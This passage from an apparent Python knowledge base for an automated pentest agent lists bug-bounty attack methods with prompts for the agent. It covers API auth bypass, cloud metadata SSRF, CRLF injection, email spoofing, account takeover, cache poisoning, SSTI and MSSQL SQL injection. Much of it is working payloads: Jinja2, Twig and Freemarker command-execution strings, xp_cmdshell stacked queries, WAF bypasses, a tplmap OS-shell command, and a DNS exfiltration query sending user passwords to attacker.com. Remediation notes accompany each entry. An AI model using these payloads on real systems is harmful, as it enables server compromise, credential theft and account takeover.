  curl -I https://target.com 2>/dev/null | grep -iE "(strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy|cross-origin)"

MISSING HEADERS = FINDING:
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  Content-Security-Policy: default-src 'self'
  X-Frame-Options: DENY (or frame-ancestors 'none')
  X-Content-Type-Options: nosniff
  Referrer-Policy: strict-origin-when-cross-origin
  Permissions-Policy: geolocation=(), microphone=()

OWASP ALIGNED CHECKS:
  httpx -u https://target.com -include-response-header | grep -i security
  nuclei -u target.com -t http/misconfiguration/http-missing-security-headers.yaml

Evidence: SSLv2/v3 accepted, weak ciphers, missing HSTS, missing CSP
""",
        "impact": "Weak SSL/TLS enables MITM attacks. Missing security headers enable clickjacking (X-Frame-Options), MIME sniffing (X-Content-Type), and XSS (CSP).",
        "remediation": "Enforce TLS 1.2+ only. Use strong cipher suites. Implement HSTS with long max-age. Configure all security headers. Use certificate transparency monitoring.",
        "learned_mission": "Audit all HTTPS endpoints for SSL/TLS weaknesses and missing security headers. Use sslscan+testssl for cipher audit. Use curl-headers for header check.",
        "learned_prompt": "Run sslscan and testssl on all HTTPS hosts. Check headers with curl -I. Look for missing HSTS, CSP, X-Frame-Options. Run nuclei missing-security-headers template.",
        "affected_phases": ["P18", "P05"],
        "affected_skills": ["risk_assessment", "asset_discovery"],
        "recommended_tools": ["sslscan", "testssl", "nmap", "curl-headers", "httpx", "nuclei"],
        "learned_techniques": [
            {"name": "SSL/TLS cipher audit", "phase": "P18", "tool": "sslscan"},
            {"name": "Security headers check", "phase": "P05", "tool": "curl-headers"},
            {"name": "HSTS validation", "phase": "P18", "tool": "testssl"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # API SECURITY (P16)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "API Security Testing - GraphQL, REST, Version Discovery (KingOfBugBounty)",
        "vulnerability_type": "API Vulnerability",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Complete API security testing methodology: GraphQL introspection, REST endpoint discovery, authentication bypass, rate limiting, BOLA/IDOR, and mass scanning.",
        "steps_to_reproduce": """
GRAPHQL INTROSPECTION:
  POST /graphql {"query":"{__schema{types{name}}}"}
  POST /graphql {"query":"{__typename}"}
  Find endpoints: /graphql, /graphiql, /playground, /console, /gql, /api/graphql

REST API DISCOVERY:
  cat alive.txt | httpx -silent -path /api/v1,/api/v2,/api/v3,/swagger.json,/openapi.json
  ffuf -u https://target.com/api/vFUZZ/users -w <(seq 1 20) -mc 200,401,403
  ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -H "Content-Type: application/json"

API AUTH BYPASS WITH HEADERS:
  curl "$url" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1"

BROKEN AUTHENTICATION:
  cat api_endpoints.txt | httpx -silent -mc 200 -fc 401,403 | anew no_auth_endpoints.txt

BOLA/IDOR IN APIS:
  cat urls.txt | grep -oE "(id|user_id|account_id|uid)=[0-9]+" | sed 's/=[0-9]*/=FUZZ/' | sort -u

HTTP METHOD FUZZING:
  for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$url")
    echo "$method $url - $CODE"
  done | grep -vE " - (404|405)$"

RATE LIMITING:
  for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" "https://target.com/api/endpoint"; done | sort | uniq -c

SWAGGER/OPENAPI FUZZING:
  ffuf -u https://target.com/FUZZ -w <(echo -e "swagger.json\nswagger.yaml\nopenapi.json\nopenapi.yaml\napi-docs\nswagger-ui.html\napi/swagger.json")
  Extract paths: cat swagger.json | jq -r '.paths | keys[]'

JWT EXTRACTION FROM TRAFFIC:
  cat urls.txt | httpx -silent | katana -d 3 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*"

Evidence: Unauthenticated API access, another user's data via IDOR, GraphQL schema dump, rate limit bypass
""",
        "impact": "API vulnerabilities expose sensitive data, enable mass account enumeration, and bypass authentication to access admin functionality.",
        "remediation": "Implement consistent authentication on all endpoints. Disable GraphQL introspection in production. Rate limit all APIs. Implement per-object authorization checks.",
        "learned_mission": "Discover all API endpoints via swagger and fuzzing. Test auth bypass with IP headers. Check GraphQL introspection. Test all HTTP methods. Look for BOLA.",
        "learned_prompt": "Find swagger/openapi docs. Test GraphQL introspection. Fuzz API version paths. Test endpoints without auth. Use X-Forwarded-For for auth bypass attempts.",
        "affected_phases": ["P16"],
        "affected_skills": ["risk_assessment", "delivery_mapping"],
        "recommended_tools": ["nuclei", "arjun", "wapiti", "ffuf-params", "ffuf-post"],
        "learned_techniques": [
            {"name": "GraphQL introspection", "phase": "P16", "tool": "nuclei"},
            {"name": "REST API discovery", "phase": "P16", "tool": "ffuf-params"},
            {"name": "API auth bypass", "phase": "P16", "tool": "nuclei"},
            {"name": "API BOLA/IDOR", "phase": "P16", "tool": "arjun"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # CLOUD SECURITY (P10)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Cloud Asset Exposure - AWS S3, GCP, Azure, Firebase (KingOfBugBounty)",
        "vulnerability_type": "Cloud Misconfiguration",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Cloud asset enumeration and misconfiguration testing: open S3 buckets, Firebase open databases, Azure blob storage, GCP storage, and cloud metadata via SSRF.",
        "steps_to_reproduce": """
S3 BUCKET DISCOVERY:
  cat urls.txt | grep -oE "[a-zA-Z0-9.-]+\.s3\.amazonaws\.com" | anew s3_buckets.txt
  cat urls.txt | grep -oE "s3://[a-zA-Z0-9.-]+" | anew s3_buckets.txt
  subfinder -d target.com | httpx -silent | grep -oE "[a-zA-Z0-9-]+\.s3[.-]"

S3 PERMISSION CHECK:
  aws s3 ls s3://BUCKET_NAME --no-sign-request
  aws s3 cp s3://BUCKET_NAME/secret.txt . --no-sign-request
  curl https://BUCKET.s3.amazonaws.com/ (check XML listing)

FIREBASE:
  cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.firebaseio\.com"
  curl https://APP.firebaseio.com/.json (should return null or 401)
  curl https://APP.firebaseio.com/users.json

AZURE BLOB:
  cat urls.txt | grep -oE "[a-zA-Z0-9-]+\.blob\.core\.windows\.net"
  curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"

GCP STORAGE:
  cat urls.txt | grep -oE "storage\.googleapis\.com/[a-zA-Z0-9-]+"
  curl https://storage.googleapis.com/BUCKET_NAME/

CLOUD METADATA VIA SSRF:
  AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GCP: http://metadata.google.internal/computeMetadata/v1/ -H "Metadata-Flavor: Google"
  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"

CLOUD CREDENTIAL FILES:
  cat alive.txt | httpx -silent -path /.aws/credentials,/.docker/config.json,/kubeconfig,.gcloud/credentials.db

Evidence: S3 bucket listing, Firebase data access, cloud credential retrieval
""",
        "impact": "Open cloud storage exposes sensitive data including backups, customer PII, and internal documents. Cloud metadata access yields temporary credentials for full account compromise.",
        "remediation": "Set S3 bucket ACLs to private. Enable Firebase security rules. Disable public blob access. Use IMDSv2 with hop limit. Regularly audit cloud asset permissions.",
        "learned_mission": "Enumerate cloud assets in discovered URLs. Test S3 buckets with --no-sign-request. Check Firebase for open .json endpoint. Test cloud metadata via SSRF.",
        "learned_prompt": "Extract cloud storage URLs from crawl data. Test S3 with aws cli --no-sign-request. Check Firebase /.json. Test cloud metadata SSRF at 169.254.169.254.",
        "affected_phases": ["P10"],
        "affected_skills": ["threat_intel", "risk_assessment"],
        "recommended_tools": ["nuclei", "shodan-cli", "trufflehog"],
        "learned_techniques": [
            {"name": "S3 bucket enumeration", "phase": "P10", "tool": "nuclei"},
            {"name": "Firebase open database", "phase": "P10", "tool": "nuclei"},
            {"name": "Cloud metadata SSRF", "phase": "P10", "tool": "nuclei"},
            {"name": "Azure blob enumeration", "phase": "P10", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # CRLF INJECTION (P12)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "CRLF Injection - HTTP Response Splitting (AllAboutBugBounty)",
        "vulnerability_type": "CRLF Injection",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "CRLF injection for HTTP response splitting, header injection, and XSS via injected headers. Target redirect responses (301-308).",
        "steps_to_reproduce": """
WHERE: Endpoints with redirect responses (301,302,303,307,308). Look for lang=, url=, redirect= parameters.

BASIC INJECTION:
  https://target.com/?lang=en%0D%0ALocation:%20https://evil.com/
  (Injects Location header → redirect hijack)

HTTP RESPONSE SPLITTING:
  https://target.com/?lang=en%0D%0AContent-Type:%20text/html%0D%0A%0D%0A<script>alert(1)</script>

DOUBLE ENCODED:
  %250D%250A (double URL encode)

UNICODE BYPASS:
  %E5%98%8A%E5%98%8D (Unicode equivalents of CR LF)

COMMON PAYLOADS:
  %0d%0a (CRLF)
  %0a (LF only)
  \r\n (literal)
  %23%0d%0a (hash + CRLF)

FIND CANDIDATES:
  Look for redirect responses where input appears in Location/header
  nuclei -u target.com -t http/vulnerabilities/generic/crlf-injection.yaml

Evidence: Response contains injected Location header, XSS via injected Content-Type, or cookie injection
""",
        "impact": "CRLF injection enables header injection, XSS via injected HTML response, cookie injection, log poisoning, and HTTP response splitting.",
        "remediation": "Strip or reject CR and LF characters from user input used in HTTP headers. Use framework methods to set headers that automatically sanitize.",
        "learned_mission": "Test redirect parameters for CRLF. Try %0d%0a and encoded variants. Check if injected headers appear in response.",
        "learned_prompt": "Test lang/url/redirect parameters with %0d%0a injection. Check redirect responses. Run nuclei CRLF template.",
        "affected_phases": ["P12"],
        "affected_skills": ["risk_assessment", "adversarial_hypothesis"],
        "recommended_tools": ["nuclei", "wapiti"],
        "learned_techniques": [
            {"name": "CRLF header injection", "phase": "P12", "tool": "nuclei"},
            {"name": "CRLF XSS via response splitting", "phase": "P12", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # NUCLEI & AUTOMATION (P11)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Nuclei Automated Vulnerability Scanning Pipeline (KingOfBugBounty)",
        "vulnerability_type": "CVE / Misconfiguration",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "Complete nuclei scanning pipelines for CVE detection, subdomain takeover, exposed panels, misconfigurations, and DAST mode.",
        "steps_to_reproduce": """
FULL TEMPLATE SCAN:
  nuclei -l alive.txt -t /nuclei-templates/ -severity critical,high,medium -c 50 -rl 150 -o nuclei_results.txt

CVE SCANNING:
  nuclei -l alive.txt -t cves/ -severity critical,high -c 30 -o cve_results.txt

SUBDOMAIN TAKEOVER:
  subfinder -d target.com -silent | httpx -silent | nuclei -t takeovers/ -c 50

EXPOSED PANELS:
  nuclei -l alive.txt -t exposed-panels/ -c 50 | anew panels.txt

MISCONFIGURATIONS:
  nuclei -l alive.txt -t misconfiguration/ -severity high,critical

DAST MODE (dynamic testing):
  nuclei -l urls.txt -dast -rl 10 -c 3 -o dast_results.txt
  cat urls.txt | httpx -silent | nuclei -dast -t dast/vulnerabilities/xss/ -rl 50

TAG-BASED:
  nuclei -l alive.txt -tags cve,rce,sqli,xss -severity critical,high -o tagged_results.txt

NETWORK SCANNING:
  nuclei -l ips.txt -t network/ -c 25 -o network_vulns.txt

MISSING SECURITY HEADERS:
  nuclei -l alive.txt -t http/misconfiguration/http-missing-security-headers.yaml

CUSTOM CHAIN:
  subfinder -d target.com -silent | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high

Evidence: CVE matches, exposed panels, misconfigurations, DAST-confirmed injection points
""",
        "impact": "Nuclei detects known CVEs, exposed admin panels, and misconfigurations that represent direct exploitation paths.",
        "remediation": "Patch all identified CVEs. Remove exposed admin panels from public access. Fix reported misconfigurations following nuclei template remediation guidance.",
        "learned_mission": "Run nuclei with full template set on all alive hosts. Use tag filtering for specific vulnerability classes. Use DAST mode on parameter-rich URLs.",
        "learned_prompt": "Run nuclei with -severity critical,high on all alive hosts. Use -tags cve,rce,sqli,xss for targeted scans. Enable DAST for dynamic testing of URLs with parameters.",
        "affected_phases": ["P11", "P12", "P13"],
        "affected_skills": ["risk_assessment", "threat_intel"],
        "recommended_tools": ["nuclei", "nmap-vulscan"],
        "learned_techniques": [
            {"name": "Nuclei CVE scanning", "phase": "P11", "tool": "nuclei"},
            {"name": "Nuclei DAST mode", "phase": "P12", "tool": "nuclei"},
            {"name": "Nuclei subdomain takeover", "phase": "P09", "tool": "nuclei"},
            {"name": "Nuclei exposed panels", "phase": "P11", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # EMAIL SECURITY (P08)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Email Security - SPF/DMARC Spoofing (AllAboutBugBounty)",
        "vulnerability_type": "Email Spoofing",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Email spoofing via missing or misconfigured SPF and DMARC records. Test if target's domain can be used to send spoofed emails.",
        "steps_to_reproduce": """
1. CHECK SPF RECORD:
   dig TXT target.com | grep "v=spf1"
   No SPF record = email spoofing possible

2. CHECK DMARC RECORD:
   dig TXT _dmarc.target.com | grep "v=DMARC1"
   DMARC p=none = reporting only, spoofing still possible
   No DMARC = no protection

3. CHECK DKIM:
   dig TXT default._domainkey.target.com
   (selector may vary - try: selector1, default, google, mail)

4. SPOOFING TEST:
   If SPF missing: send email from attacker server claiming to be target.com
   Use tools: emkei.cz (web), swaks (CLI), sendmail

5. VERIFY SPOOFING WORKS:
   swaks --to test@gmail.com --from admin@target.com --server mail.attacker.com

FINDINGS:
   - No SPF = Critical (can send as any address @target.com)
   - SPF exists but DMARC missing/none = Medium (SPF bypass possible)
   - DMARC p=none = Low (monitoring only)
   - DMARC p=quarantine/reject with SPF+DKIM = Secure

Evidence: Email received from spoofed target.com domain in inbox
""",
        "impact": "Email spoofing enables phishing attacks using the organization's trusted domain, bypassing email filters that check sender domain.",
        "remediation": "Implement SPF with -all. Set DMARC p=reject. Configure DKIM. Enable DMARC reporting. Use MTA-STS.",
        "learned_mission": "Check SPF and DMARC records for all discovered domains. Missing or weak policies are reportable findings.",
        "learned_prompt": "Query SPF with dig TXT target.com. Check DMARC at _dmarc.target.com. Missing SPF or DMARC p=none = finding.",
        "affected_phases": ["P08"],
        "affected_skills": ["threat_intel", "asset_discovery"],
        "recommended_tools": ["theHarvester", "nuclei"],
        "learned_techniques": [
            {"name": "SPF record check", "phase": "P08", "tool": "theHarvester"},
            {"name": "DMARC record check", "phase": "P08", "tool": "theHarvester"},
            {"name": "Email spoofing test", "phase": "P08", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # ACCOUNT TAKEOVER (P14, P19)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Account Takeover Techniques (AllAboutBugBounty)",
        "vulnerability_type": "Account Takeover",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "5 account takeover vectors: OAuth misconfiguration, re-signup, CSRF, IDOR on password change, and 2FA rate limit exhaustion.",
        "steps_to_reproduce": """
1. OAUTH ACCOUNT CONFUSION:
   Register with OAuth using victim's email
   If OAuth and password auth share accounts → access victim's account

2. RE-SIGNUP ATTACK:
   Create account → delete → re-create with same email + different password
   Or: repeatedly attempt registration with same email
   Some systems overwrite existing password

3. CSRF ON ACCOUNT SETTINGS:
   CSRF on email change endpoint → change victim's email to attacker's
   Then use "Forgot password" to take over account

4. IDOR ON PASSWORD CHANGE:
   POST /api/change-password {"user_id": VICTIM_ID, "new_password": "attacker123"}
   Replace own user_id with victim's

5. 2FA BRUTE FORCE:
   No rate limit on OTP verification
   Brute force all 6-digit codes (000000-999999)
   Use parallel requests to speed up

FORGOT PASSWORD VECTORS:
   Host header injection → reset link to attacker domain
   Parameter pollution → email=victim@t.com,attacker@t.com
   Token predictability → timestamp/username-based tokens
   X-Forwarded-Host injection in reset request
   Email header injection → CC attacker on reset email

Evidence: Successfully logged into victim account, or performed action as victim
""",
        "impact": "Account takeover gives full access to victim's account, data, and any linked services.",
        "remediation": "Prevent OAuth/password auth email collision. Rate limit OTP attempts. Validate user_id server-side for all sensitive operations. Add CSRF protection to account settings.",
        "learned_mission": "Test account lifecycle: registration, password reset, email change, and 2FA for takeover vectors. Chain CSRF+IDOR for compound attacks.",
        "learned_prompt": "Test forgot password with Host header injection. Check IDOR on password change. Test OAuth email confusion. Rate limit 2FA. Try CSRF on email change.",
        "affected_phases": ["P14", "P19"],
        "affected_skills": ["risk_assessment", "installation_risk"],
        "recommended_tools": ["nuclei", "hydra", "curl-headers"],
        "learned_techniques": [
            {"name": "Account takeover via CSRF", "phase": "P14", "tool": "nuclei"},
            {"name": "Account takeover via IDOR", "phase": "P19", "tool": "nuclei"},
            {"name": "Password reset poisoning", "phase": "P14", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # WEB CACHE POISONING (P13)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Web Cache Poisoning & Cache Deception (AllAboutBugBounty)",
        "vulnerability_type": "Web Cache Poisoning",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Web cache poisoning via unkeyed headers and web cache deception for stealing cached private data.",
        "steps_to_reproduce": """
WEB CACHE POISONING:
1. Inject X-Forwarded-Host with XSS payload:
   GET / HTTP/1.1
   Host: target.com
   X-Forwarded-Host: "><script>alert(1)</script>

   If response cached and injected → XSS for all visitors

2. Cache Seizure via X-Host:
   X-Host: attacker.com → response cached with attacker.com resources

3. Route Poisoning:
   Manipulate backend routing to serve 3rd party content from legitimate domain

IDENTIFY UNKEYED HEADERS:
  Add X-Forwarded-Host, X-Host, User-Agent to requests
  Check if Cf-Cache-Status: HIT persists with injected headers

WEB CACHE DECEPTION:
  Attacker crafts URL: https://target.com/profile.php/nonexistent.css
  Server serves /profile page content (user's private data)
  Cache stores response because .css extension → treat as static
  Attacker fetches same URL → gets victim's cached profile data

BYPASS VARIATIONS:
  /profile/setting/.js
  /profile/setting/;.js
  /profile/setting%0D.css
  Add ?cb=random to get uncached response, remove for cached version

VERIFICATION:
  Check Cf-Cache-Status: HIT vs MISS
  Test in private browser to confirm unauthorized access

Evidence: Cached response contains victim's private data, or XSS payload served from cache to multiple users
""",
        "impact": "Cache poisoning delivers malicious content to all users from trusted domain. Cache deception exposes private user data to attackers.",
        "remediation": "Include security-sensitive headers in cache key. Validate input before using in cached responses. Configure cache to not store private/authenticated content.",
        "learned_mission": "Test for unkeyed headers that affect response. Inject X-Forwarded-Host. Test cache deception with static file extensions on dynamic endpoints.",
        "learned_prompt": "Test X-Forwarded-Host injection and check cache status. Try /profile/.css and /profile/;.js for cache deception. Verify with Cf-Cache-Status header.",
        "affected_phases": ["P13"],
        "affected_skills": ["risk_assessment", "adversarial_hypothesis"],
        "recommended_tools": ["nuclei", "httpx"],
        "learned_techniques": [
            {"name": "Web cache poisoning via X-Forwarded-Host", "phase": "P13", "tool": "nuclei"},
            {"name": "Web cache deception", "phase": "P13", "tool": "nuclei"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # SSTI (P12)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Server-Side Template Injection (SSTI) - RCE via Templates (KingOfBugBounty)",
        "vulnerability_type": "SSTI",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips"],
        "summary": "SSTI detection and RCE exploitation across Jinja2, Twig, Freemarker, and other template engines.",
        "steps_to_reproduce": """
DETECTION:
  Inject {{7*7}} → if output is 49 = Jinja2/Twig
  Inject ${7*7} → if output is 49 = Freemarker/Groovy
  Inject <%= 7*7 %> → if output is 49 = ERB (Ruby)
  Inject #{7*7} → if output is 49 = Ruby interpolation

AUTOMATED:
  cat urls.txt | gf ssti | qsreplace "{{7*7}}" | httpx -silent -match-string "49"
  cat urls.txt | qsreplace '${7*7}' | httpx -silent -mr "49"

JINJA2 RCE:
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

JINJA2 FILTER BYPASS:
  {{()|attr('\\x5f\\x5fclass\\x5f\\x5f')}}

TWIG RCE:
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

FREEMARKER RCE:
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

GROOVY (Jenkins):
  #{7*7}
  ${"freemarker.template.utility.Execute"?new()("id")}

TOOLS:
  tplmap -u "https://target.com/?param=*" --os-shell

Evidence: Expression evaluated (49 output), or command execution output in response
""",
        "impact": "SSTI leads to Remote Code Execution, full server compromise, file read, and network pivoting.",
        "remediation": "Never pass user input directly to template engines. Use template sandboxing. Sanitize input before templating. Use logic-less templates where possible.",
        "learned_mission": "Test all parameters for SSTI with {{7*7}} and ${7*7}. Escalate to RCE with engine-specific payloads. Use tplmap for automation.",
        "learned_prompt": "Use gf ssti to filter candidates. Test {{7*7}} first. If 49 returned = Jinja2. Try os.popen for RCE. Test ${7*7} for Freemarker.",
        "affected_phases": ["P12"],
        "affected_skills": ["risk_assessment", "exploitation_validation"],
        "recommended_tools": ["nuclei", "wapiti"],
        "learned_techniques": [
            {"name": "SSTI detection", "phase": "P12", "tool": "nuclei"},
            {"name": "Jinja2 RCE", "phase": "P12", "tool": "nuclei"},
            {"name": "SSTI to RCE", "phase": "P12", "tool": "wapiti"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # SUPPLY CHAIN / DEPENDENCIES (P22)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Dependency & Supply Chain Risk Analysis (KingOfBugBounty + AllAboutBugBounty)",
        "vulnerability_type": "Supply Chain Risk",
        "source_kind": "bug_bounty_repository",
        "source_urls": ["https://github.com/KingOfBugbounty/KingOfBugBountyTips", "https://github.com/daffainfo/AllAboutBugBounty"],
        "summary": "Broken link hijacking, exposed source code via VCS, dependency vulnerabilities (retire.js, trivy), and supply chain risk detection.",
        "steps_to_reproduce": """
BROKEN LINK HIJACKING:
  Tools: broken-link-checker, Check My Links (Chrome)
  Find dead links to expired domains
  Register the expired domain
  Social media account links are prime targets

EXPOSED VCS:
  cat urls.txt | httpx -silent -path /.git/config -mc 200 -ms "[core]"
  cat urls.txt | httpx -silent -path /.svn/entries,/.bzr/README,/CVS/Root -mc 200
  Tools: git-dumper, svn-extractor, hg-dumper

DEPENDENCY ANALYSIS:
  # JavaScript (retire.js):
  retire --path ./webapp --outputformat json
  cat js.txt | xargs -I@ curl -s @ | retire --js --piped --outputformat json

  # Container (trivy):
  trivy image target:latest --severity HIGH,CRITICAL
  trivy fs ./project --severity HIGH,CRITICAL

  # Python (bandit/safety):
  bandit -r ./src -f json
  safety check -r requirements.txt

  # General:
  semgrep --config=auto ./src

KUBERNETES EXPOSURE:
  nuclei -l alive.txt -t http/exposures/configs/kubernetes-kube-env.yaml
  cat alive.txt | httpx -silent -path /api/v1,/api/v1/namespaces -mc 200

Evidence: Accessible .git repo with credentials, vulnerable dependency CVE, broken link claimed
""",
        "impact": "Supply chain vulnerabilities lead to dependency confusion attacks, exposed credentials via VCS, and exploitation of known CVEs in bundled libraries.",
        "remediation": "Implement Software Composition Analysis (SCA) in CI/CD. Monitor dependencies for new CVEs. Remove VCS directories from webroot. Monitor and reclaim broken external links.",
        "learned_mission": "Check for VCS exposure on all hosts. Analyze JS for known vulnerable libraries. Scan containers with trivy. Look for broken links.",
        "learned_prompt": "Test /.git/config access. Analyze JS files with retire. Run trivy on any discovered containers. Scan with semgrep. Check for broken external links.",
        "affected_phases": ["P22"],
        "affected_skills": ["actions_on_objectives", "threat_intel"],
        "recommended_tools": ["retire", "trivy", "semgrep", "bandit", "gitleaks"],
        "learned_techniques": [
            {"name": "VCS exposure", "phase": "P22", "tool": "gitleaks"},
            {"name": "Dependency CVE scan", "phase": "P22", "tool": "retire"},
            {"name": "Container security scan", "phase": "P22", "tool": "trivy"},
            {"name": "SAST analysis", "phase": "P22", "tool": "semgrep"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # ASP / ASP.NET / MSSQL SQL INJECTION (Invicti SQLi cheatsheet)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "ASP/MSSQL SQL Injection - 'search' parameter (Invicti cheatsheet)",
        "vulnerability_type": "SQL Injection",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet"],
        "summary": "Classic SQLi tactics against ASP/ASP.NET back-ended by Microsoft SQL Server. Always test the search/query/id parameter first with boolean, then union, then time-based WAITFOR DELAY to fingerprint MSSQL. ASP apps almost always concatenate strings into SQL, making boolean and stacked queries highly effective.",
        "steps_to_reproduce": """
TARGET FINGERPRINT (ASP/.aspx/.asp + MSSQL):
  - URL ends in .asp, .aspx, .ashx
  - Response header 'X-AspNet-Version' or 'X-Powered-By: ASP.NET'
  - Cookie ASP.NET_SessionId or ASPSESSIONID*

PARAMETER ENTRYPOINTS (priority order):
  1. ?search=<value>
  2. ?id=, ?q=, ?query=, ?keyword=, ?name=, ?category=
  3. POST body fields with the same names
  4. Cookies and headers (Referer, X-Forwarded-For) on legacy ASP

1) BOOLEAN BLIND (ASP/MSSQL):
   /products.asp?search=test' AND 1=1--           (should return data)
   /products.asp?search=test' AND 1=2--           (should return empty)
   /products.asp?search=test%' AND '1'='1         (string-context twin)

2) ERROR-BASED (MSSQL):
   /products.asp?search=test' HAVING 1=1--
   /products.asp?search=test' GROUP BY 1 HAVING 1=1--
   /products.asp?search=test' AND 1=CONVERT(int,@@version)--    (leaks @@version in error)
   /products.asp?search=test' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--

3) UNION-BASED (MSSQL):
   /products.asp?search=test' UNION SELECT NULL--
   /products.asp?search=test' UNION SELECT NULL,NULL,NULL,NULL--   (raise NULL count until OK)
   /products.asp?search=test' UNION SELECT @@version,NULL,NULL,NULL--
   /products.asp?search=test' UNION SELECT name,NULL,NULL,NULL FROM sysobjects WHERE xtype='U'--
   /products.asp?search=test' UNION SELECT name,NULL,NULL,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--

4) TIME-BASED BLIND (MSSQL WAITFOR DELAY):
   /products.asp?search=test'; WAITFOR DELAY '0:0:10'--
   /products.asp?search=test' IF(SUBSTRING((SELECT @@version),1,1)='M') WAITFOR DELAY '0:0:10'--
   /products.asp?search=test'); WAITFOR DELAY '0:0:10'--     (closing paren variant)

5) STACKED QUERIES (MSSQL accepts ;):
   /products.asp?search=test'; EXEC xp_cmdshell 'whoami'--       (if xp_cmdshell enabled - RCE)
   /products.asp?search=test'; INSERT INTO log VALUES ('x')--

6) MSSQL OUT-OF-BAND (DNS exfil):
   /products.asp?search=test'; DECLARE @q VARCHAR(1024); SET @q='\\\\'+(SELECT TOP 1 password FROM users)+'.attacker.com\\share'; EXEC master..xp_dirtree @q--

7) AUTHENTICATION BYPASS (login forms backed by MSSQL):
   username=admin'--&password=anything
   username=' OR 1=1--&password=x
   username=admin' /* &password=x

8) WAF / FILTER BYPASS:
   - Inline comments to break keyword filters:  UN/**/ION SE/**/LECT
   - Mixed case:                                 UnIoN SeLeCt
   - Whitespace alternatives:                    UNION%09SELECT, UNION%0BSELECT
   - Hex literals (avoid quotes):                0x61646D696E   (= 'admin')
   - CHAR() construction:                        CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
   - Percent-encoded single-quote:               %27, %u0027 (legacy IIS double-decode)

9) AUTOMATION (skill-driven):
   sqlmap -u "https://target/products.asp?search=test" --dbms=mssql --level=5 --risk=3 --batch --random-agent
   sqlmap -u "https://target/products.asp?search=test" --dbms=mssql --technique=BEUSTQ --tamper=between,space2comment,charencode --batch
   sqlmap -u "https://target/products.asp" --data="search=test" --cookie="ASP.NET_SessionId=..." --batch
   wapiti -u "https://target/" -m sql,blindsql --color
   ghauri -u "https://target/products.asp?search=test*" --batch --dbms mssql      (alternative sqlmap)

EVIDENCE TO CAPTURE:
  - HTTP request + parameter that fired (raw)
  - Differential response between 1=1 vs 1=2 (boolean)
  - Time delta between baseline and WAITFOR DELAY (time-based)
  - Returned banner / @@version / sysobjects rows (union/error)
  - sqlmap log line "Parameter X appears to be ... injectable"
""",
        "impact": "Full read/write access to MSSQL backend, leakage of credentials and PII, potential RCE via xp_cmdshell, lateral movement into AD when SQL Server runs as a domain account.",
        "remediation": "Use parameterized queries / ADO.NET SqlCommand with SqlParameter. Apply least-privilege DB accounts (deny xp_cmdshell, deny dbo). Validate input type, length, and character set. Deploy WAF rules for UNION/WAITFOR. Patch SQL Server.",
        "learned_mission": "Em ambientes ASP/ASP.NET, sempre testar SQLi no parâmetro 'search' (e similares) com payload boolean, depois union, depois time-based MSSQL. Confirmar o DB backend via @@version e sysobjects. Nunca encerrar a skill após uma única ferramenta — combinar sqlmap + wapiti (ou ghauri) para triangular.",
